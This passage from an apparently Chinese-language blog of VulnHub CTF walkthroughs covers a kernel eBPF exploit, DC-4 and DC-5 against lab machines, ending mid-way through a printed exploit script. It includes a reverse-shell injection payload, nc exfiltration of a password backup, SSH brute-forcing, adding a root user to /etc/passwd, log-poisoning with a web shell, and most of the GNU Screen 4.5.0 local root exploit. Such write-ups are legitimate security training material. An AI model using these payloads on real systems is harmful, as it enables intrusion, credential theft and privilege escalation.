</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676593<span style=color:#f92672>]</span> CS:  <span style=color:#ae81ff>0010</span> DS: <span style=color:#ae81ff>0000</span> ES: <span style=color:#ae81ff>0000</span> CR0: 000000008005003b
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676594<span style=color:#f92672>]</span> CR2: ffffc900069c5010 CR3: 00000009ae9ce000 CR4: 00000000000006f0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676598<span style=color:#f92672>]</span> Stack:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676599<span style=color:#f92672>]</span>  ffffffff8117810e ffff8809b2f3fde8 ffffffff811783c6 ffffc90814ce6000
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676600<span style=color:#f92672>]</span>  <span style=color:#ae81ff>0000000000000008</span> ffff8809b55468e0 ffff8809b2f3fdf8 ffffffff811729bd
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676602<span style=color:#f92672>]</span>  ffff8809b2f3fe10 ffffffff811733b9 ffff880230ebc100 ffff8809b2f3fe58
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676603<span style=color:#f92672>]</span> Call Trace:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676607<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff8117810e&gt;<span style=color:#f92672>]</span> ? prog_fd_array_put_ptr+0xe/0x10
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676609<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff811783c6&gt;<span style=color:#f92672>]</span> bpf_fd_array_map_clear+0x36/0x50
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676611<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff811729bd&gt;<span style=color:#f92672>]</span> bpf_map_put_uref+0x1d/0x20
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676612<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff811733b9&gt;<span style=color:#f92672>]</span> bpf_map_release+0x19/0x30
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676616<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff8120e514&gt;<span style=color:#f92672>]</span> __fput+0xe4/0x220
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676617<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff8120e68e&gt;<span style=color:#f92672>]</span> ____fput+0xe/0x10
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676621<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff8109e943&gt;<span style=color:#f92672>]</span> task_work_run+0x73/0x90
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676625<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff81083ba4&gt;<span style=color:#f92672>]</span> do_exit+0x2e4/0xae0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676626<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff81084423&gt;<span style=color:#f92672>]</span> do_group_exit+0x43/0xb0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676628<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff810844a4&gt;<span style=color:#f92672>]</span> SyS_exit_group+0x14/0x20
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676632<span style=color:#f92672>]</span>  <span style=color:#f92672>[</span>&lt;ffffffff818244f2&gt;<span style=color:#f92672>]</span> entry_SYSCALL_64_fastpath+0x16/0x71
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676633<span style=color:#f92672>]</span> Code: cf <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>55</span> <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> e5 <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> <span style=color:#ae81ff>78</span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> <span style=color:#ae81ff>07</span> <span style=color:#ae81ff>48</span> c7 <span style=color:#ae81ff>47</span> <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>60</span> <span style=color:#ae81ff>55</span> e6 <span style=color:#ae81ff>81</span> <span style=color:#ae81ff>48</span> <span style=color:#ae81ff>89</span> 3d 4a <span style=color:#ae81ff>20</span> cf <span style=color:#ae81ff>00</span> 5d c3 0f 1f <span style=color:#ae81ff>84</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>00</span> <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>66</span> <span style=color:#ae81ff>90</span> &lt;48&gt; 8b <span style=color:#ae81ff>47</span> <span style=color:#ae81ff>10</span> 3e ff <span style=color:#ae81ff>08</span> <span style=color:#ae81ff>74</span> <span style=color:#ae81ff>01</span> c3 <span style=color:#ae81ff>55</span> <span style=color:#ae81ff>48</span> 8b 7f <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>48</span> c7 c6 <span style=color:#ae81ff>20</span> 2f <span style=color:#ae81ff>17</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676649<span style=color:#f92672>]</span> RIP  <span style=color:#f92672>[</span>&lt;ffffffff81173525&gt;<span style=color:#f92672>]</span> bpf_prog_put_rcu+0x5/0x30
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676650<span style=color:#f92672>]</span>  RSP &lt;ffff8809b2f3fdb8&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676651<span style=color:#f92672>]</span> CR2: ffffc900069c5010
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676653<span style=color:#f92672>]</span> ---<span style=color:#f92672>[</span> end trace 90333448b9273067 <span style=color:#f92672>]</span>---
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> 1850.676655<span style=color:#f92672>]</span> Fixing recursive fault but reboot is needed!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>I believe that this issue illustrates that reference count hardening
</span></span><span style=display:flex><span>makes sense, even without reference leaks.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>A suggested patch <span style=color:#f92672>(</span>compile-tested<span style=color:#f92672>)</span> is attached.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Fixed in https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/kernel/bpf?id<span style=color:#f92672>=</span>92117d8443bc5afacc8d5ba82e541946310f106e
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Proof of Concept:
</span></span><span style=display:flex><span>https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39773.zip
</span></span></code></pre></div><p>蚁剑终端里不知道为什么无法提权，反弹shell后实现提权：</p><pre tabindex=0><code>$ wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
$ unzip 39772.zip
$ cd 39772
$ tar -xvf refcount_overflow.tar
$ cd ebpf_mapfd_doubleput_exploit
</code></pre><p>the-flag.txt：</p><pre tabindex=0><code>cat /root/the-flag.txt
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)
                                                     

Congratulations are in order.  :-)

I hope you&#39;ve enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
</code></pre><hr><h2 id=vulnhub-dc4>vulnhub DC4<a hidden class=anchor aria-hidden=true href=#vulnhub-dc4>#</a></h2><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.133
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00052s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>22/tcp open  ssh
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>22端口开启了ssh服务，80端口开启了http服务，先访问http服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/1.png></p><p>kali没安装FoxyProxy插件，用NAT模式配置端口映射使主机访问：<code>编辑->虚拟网络编辑器->NAT设置->添加->设置主机端口以及要访问的虚拟机Web服务ip端口</code>，Intruder爆破出密码为happy</p><p>radio参数可控，可以实现RCE，kali监听2333端口，尝试反弹shell：</p><pre tabindex=0><code>radio=bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/61.139.2.128/2333+0&gt;%261&#39;&amp;submit=Run
</code></pre><p>反弹shell成功，当前用户为<code>www-data</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nc -lvnp <span style=color:#ae81ff>2333</span>            
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>2333</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>61.139.2.128<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>61.139.2.133<span style=color:#f92672>]</span> <span style=color:#ae81ff>54614</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>459<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@dc-4:/usr/share/nginx/html$ 
</span></span></code></pre></div><p>先获取敏感文件信息，比如<code>/etc/passwd</code>，该文件只有root可写：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span></span><span style=display:flex><span>systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span></span><span style=display:flex><span>systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span></span><span style=display:flex><span>systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span></span><span style=display:flex><span>_apt:x:104:65534::/nonexistent:/bin/false
</span></span><span style=display:flex><span>messagebus:x:105:109::/var/run/dbus:/bin/false
</span></span><span style=display:flex><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>nginx:x:107:111:nginx user,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>charles:x:1001:1001:Charles,,,:/home/charles:/bin/bash
</span></span><span style=display:flex><span>jim:x:1002:1002:Jim,,,:/home/jim:/bin/bash
</span></span><span style=display:flex><span>sam:x:1003:1003:Sam,,,:/home/sam:/bin/bash
</span></span><span style=display:flex><span>Debian-exim:x:108:112::/var/spool/exim4:/bin/false
</span></span></code></pre></div><p><code>/home</code>目录下有三个用户<code>charles, jim, sam</code>，在<code>/home/jim/backups</code>目录下发现备份文件<code>old-passwords.bak</code>，可能是ssh用户密码，先用nc将密码字典传到kali上：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>kali:$ nc -lvnp <span style=color:#ae81ff>2444</span> &gt; passwords.txt
</span></span><span style=display:flex><span>target:$ nc 61.139.2.128 <span style=color:#ae81ff>2444</span> &lt; /home/jim/backups/old-passwords.bak
</span></span></code></pre></div><p>再写一个username.txt：</p><pre tabindex=0><code>jim
sam
charles
</code></pre><p>爆破ssh用户名和密码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.133 -vV
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>22<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.133   login: jim   password: jibril04
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>用ssh登录jim用户：</p><pre tabindex=0><code>ssh jim@61.139.2.133 -p 22
</code></pre><p>查看mbox文件内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>From root@dc-4 Sat Apr <span style=color:#ae81ff>06</span> 20:20:04 <span style=color:#ae81ff>2019</span>
</span></span><span style=display:flex><span>Return-path: &lt;root@dc-4&gt;
</span></span><span style=display:flex><span>Envelope-to: jim@dc-4
</span></span><span style=display:flex><span>Delivery-date: Sat, <span style=color:#ae81ff>06</span> Apr <span style=color:#ae81ff>2019</span> 20:20:04 +1000
</span></span><span style=display:flex><span>Received: from root by dc-4 with local <span style=color:#f92672>(</span>Exim 4.89<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>(</span>envelope-from &lt;root@dc-4&gt;<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        id 1hCiQe-0000gc-EC
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> jim@dc-4; Sat, <span style=color:#ae81ff>06</span> Apr <span style=color:#ae81ff>2019</span> 20:20:04 +1000
</span></span><span style=display:flex><span>To: jim@dc-4
</span></span><span style=display:flex><span>Subject: Test
</span></span><span style=display:flex><span>MIME-Version: 1.0
</span></span><span style=display:flex><span>Content-Type: text/plain; charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>
</span></span><span style=display:flex><span>Content-Transfer-Encoding: 8bit
</span></span><span style=display:flex><span>Message-Id: &lt;E1hCiQe-0000gc-EC@dc-4&gt;
</span></span><span style=display:flex><span>From: root &lt;root@dc-4&gt;
</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>06</span> Apr <span style=color:#ae81ff>2019</span> 20:20:04 +1000
</span></span><span style=display:flex><span>Status: RO
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>This is a test.
</span></span></code></pre></div><p>看起来像一封mail，查看<code>/var/mail</code>目录，发现存在jim文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>From charles@dc-4 Sat Apr <span style=color:#ae81ff>06</span> 21:15:46 <span style=color:#ae81ff>2019</span>
</span></span><span style=display:flex><span>Return-path: &lt;charles@dc-4&gt;
</span></span><span style=display:flex><span>Envelope-to: jim@dc-4
</span></span><span style=display:flex><span>Delivery-date: Sat, <span style=color:#ae81ff>06</span> Apr <span style=color:#ae81ff>2019</span> 21:15:46 +1000
</span></span><span style=display:flex><span>Received: from charles by dc-4 with local <span style=color:#f92672>(</span>Exim 4.89<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>(</span>envelope-from &lt;charles@dc-4&gt;<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>        id 1hCjIX-0000kO-Qt
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> jim@dc-4; Sat, <span style=color:#ae81ff>06</span> Apr <span style=color:#ae81ff>2019</span> 21:15:45 +1000
</span></span><span style=display:flex><span>To: jim@dc-4
</span></span><span style=display:flex><span>Subject: Holidays
</span></span><span style=display:flex><span>MIME-Version: 1.0
</span></span><span style=display:flex><span>Content-Type: text/plain; charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>
</span></span><span style=display:flex><span>Content-Transfer-Encoding: 8bit
</span></span><span style=display:flex><span>Message-Id: &lt;E1hCjIX-0000kO-Qt@dc-4&gt;
</span></span><span style=display:flex><span>From: Charles &lt;charles@dc-4&gt;
</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>06</span> Apr <span style=color:#ae81ff>2019</span> 21:15:45 +1000
</span></span><span style=display:flex><span>Status: O
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hi Jim,
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>I<span style=color:#960050;background-color:#1e0010>&#39;</span>m heading off on holidays at the end of today, so the boss asked me to give you my password just in <span style=color:#66d9ef>case</span> anything goes wrong.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Password is:  ^xHhA&amp;hvim0y
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>See ya,
</span></span><span style=display:flex><span>Charles
</span></span></code></pre></div><p>获得了Charles的ssh密码，查看是否存在可用的sudo命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ sudo -l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> charles on dc-4:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User charles may run the following commands on dc-4:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /usr/bin/teehee
</span></span><span style=display:flex><span>charles@dc-4:~$ ls /usr/bin/teehee -al
</span></span><span style=display:flex><span>-rwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>38740</span> Apr  <span style=color:#ae81ff>6</span>  <span style=color:#ae81ff>2019</span> /usr/bin/teehee
</span></span></code></pre></div><p>teehee提权，往<code>/etc/passwd</code>写入一个uid为0的无密码的用户：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ echo <span style=color:#e6db74>&#34;test::0:0:::/bin/bash&#34;</span> | sudo teehee -a /etc/passwd
</span></span><span style=display:flex><span>test::0:0:::/bin/bash
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ su test
</span></span><span style=display:flex><span>root@dc-4:/home/charles# 
</span></span></code></pre></div><p>最后查看<code>/root</code>目录下文件，获取<code>/root/flag.txt</code>文件内容：</p><pre tabindex=0><code>


888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  &#34;Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88&#34;&#34;88b 888 &#34;88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &#34;   &#34;   &#34;   &#34;  
888P     Y888  &#34;Y8888  888 888      8888888P&#34;   &#34;Y88P&#34;  888  888  &#34;Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p><p><a href=https://www.cnblogs.com/zlgxzswjy/p/16118468.html>https://www.cnblogs.com/zlgxzswjy/p/16118468.html</a></p><p><a href=https://developer.aliyun.com/article/1489918>https://developer.aliyun.com/article/1489918</a></p><hr><h2 id=vulnhub-dc5>vulnhub DC5<a hidden class=anchor aria-hidden=true href=#vulnhub-dc5>#</a></h2><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.140
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00044s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE
</span></span><span style=display:flex><span>80/tcp  open  http
</span></span><span style=display:flex><span>111/tcp open  rpcbind
</span></span></code></pre></div><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/10.png></p><p>利用dirsearch扫出目录：</p><pre tabindex=0><code>[16:48:41] 200 -    4KB - /contact.php                                      
[16:48:41] 301 -  184B  - /css  -&gt;  http://61.139.2.140/css/                
[16:48:43] 200 -    6KB - /faq.php                                          
[16:48:44] 200 -   17B  - /footer.php                                       
[16:48:45] 403 -  570B  - /images/                                          
[16:48:45] 301 -  184B  - /images  -&gt;  http://61.139.2.140/images/          
[16:48:55] 200 -  852B  - /thankyou.php
</code></pre><p>访问<code>/footer.php</code>返回copyright，访问<code>/thankyou.php</code>，发现同样存在copyright部分，可能存在文件包含，</p><pre tabindex=0><code>/thankyou.php?file=/var/log/nginx/access.log

[08/Oct/2025:02:58:36 +1000] &#34;GET /thankyou.php?file=/etc/passwd HTTP/1.1&#34; 200 986 &#34;-&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36&#34;
</code></pre><p>日志会记录UA头，注入一句话木马，蚁剑连接，先找suid权限文件：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span><span style=color:#f92672>(</span>www-data:/<span style=color:#f92672>)</span> $ find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null
</span></span><span style=display:flex><span>/bin/su
</span></span><span style=display:flex><span>/bin/mount
</span></span><span style=display:flex><span>/bin/umount
</span></span><span style=display:flex><span>/bin/screen-4.5.0
</span></span><span style=display:flex><span>/usr/bin/gpasswd
</span></span><span style=display:flex><span>/usr/bin/procmail
</span></span><span style=display:flex><span>/usr/bin/at
</span></span><span style=display:flex><span>/usr/bin/passwd
</span></span><span style=display:flex><span>/usr/bin/chfn
</span></span><span style=display:flex><span>/usr/bin/newgrp
</span></span><span style=display:flex><span>/usr/bin/chsh
</span></span><span style=display:flex><span>/usr/lib/openssh/ssh-keysign
</span></span><span style=display:flex><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style=display:flex><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style=display:flex><span>/usr/sbin/exim4
</span></span><span style=display:flex><span>/sbin/mount.nfs
</span></span></code></pre></div><p>利用searchsploit查找可用漏洞：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>$ searchsploit screen 4.5.0
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                                                                                   |  Path
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                    | linux/local/41154.sh
</span></span><span style=display:flex><span>GNU Screen 4.5.0 - Local Privilege Escalation <span style=color:#f92672>(</span>PoC<span style=color:#f92672>)</span>                                                                                              | linux/local/41152.txt
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><p>查看该脚本内容：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e># screenroot.sh</span>
</span></span><span style=display:flex><span><span style=color:#75715e># setuid screen v4.5.0 local root exploit</span>
</span></span><span style=display:flex><span><span style=color:#75715e># abuses ld.so.preload overwriting to get root.</span>
</span></span><span style=display:flex><span><span style=color:#75715e># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span>
</span></span><span style=display:flex><span><span style=color:#75715e># HACK THE PLANET</span>
</span></span><span style=display:flex><span><span style=color:#75715e># ~ infodox (25/1/2017)</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;~ gnu/screenroot ~&#34;</span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] First, we create our shell and library...&#34;</span>
</span></span><span style=display:flex><span>cat <span style=color:#e6db74>&lt;&lt; EOF &gt; /tmp/libhax.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>#include &lt;stdio.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>#include &lt;sys/types.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>#include &lt;unistd.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>__attribute__ ((__constructor__))
</span></span></span><span style=display:flex><span><span style=color:#e6db74>void dropshell(void){
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    chown(&#34;/tmp/rootshell&#34;, 0, 0);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    chmod(&#34;/tmp/rootshell&#34;, 04755);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    unlink(&#34;/etc/ld.so.preload&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    printf(&#34;[+] done!\n&#34;);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>}
</span></span></span><span style=display:flex><span><span style=color:#e6db74>EOF</span>
</span></span><span style=display:flex><span>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
</span></span><span style=display:flex><span>rm -f /tmp/libhax.c
</span></span><span style=display:flex><span>cat <span style=color:#e6db74>&lt;&lt; EOF &gt; /tmp/rootshell.c
</span></span></span><span style=display:flex><span><span style=color:#e6db74>#include &lt;stdio.h&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>int main(void){
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    setuid(0);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    setgid(0);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    seteuid(0);
